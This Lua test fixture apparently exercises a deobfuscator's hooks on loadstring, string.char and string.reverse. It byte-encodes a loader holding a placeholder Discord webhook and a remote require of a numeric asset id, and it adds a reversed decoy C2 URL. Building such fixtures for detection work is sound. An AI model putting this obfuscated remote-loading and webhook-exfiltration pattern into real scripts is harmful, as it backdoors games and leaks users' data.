-- Fixture 1: Multi-layer obfuscated loadstring + string.char / reverse / concat hooks.
local bytes = {
	108, 111, 99, 97, 108, 32, 119, 104, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47,
	100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104,
	111, 111, 107, 115, 47, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 102, 97, 107, 101, 95,
	119, 101, 98, 104, 111, 111, 107, 95, 115, 101, 99, 114, 101, 116, 34, 10,
	108, 111, 99, 97, 108, 32, 102, 50, 32, 61, 32, 108, 111, 97, 100, 115, 116, 114, 105, 110, 103, 40, 91, 91,
	114, 101, 113, 117, 105, 114, 101, 40, 52, 53, 54, 55, 56, 57, 49, 50, 51, 41, 40, 34, 98, 111, 111, 116, 34, 41,
	93, 93, 44, 32, 34, 105, 110, 110, 101, 114, 95, 115, 116, 97, 103, 101, 34, 41, 10,
	105, 102, 32, 102, 50, 32, 116, 104, 101, 110, 32, 102, 50, 40, 41, 32, 101, 110, 100, 10,
	112, 114, 105, 110, 116, 40, 34, 119, 101, 98, 104, 111, 111, 107, 32, 108, 97, 121, 101, 114, 34, 44, 32, 119, 104, 41,
}

-- Assemble via both char-by-char loop and table.concat
local chars = {}
for i, b in ipairs(bytes) do
	chars[i] = string.char(b)
end
local stage1 = table.concat(chars)

-- Also reverse a decoy domain to verify string.reverse hook
local reversedUrl = string.reverse("2v/llop/dilavni.2c-yoced//:sptth")
local _joined = string.char(114, 120, 98, 120, 95, 104, 105, 100, 100, 101, 110) .. ":" .. reversedUrl

local fn1 = loadstring(stage1, "stage1_loader")
if fn1 then
	fn1()
end
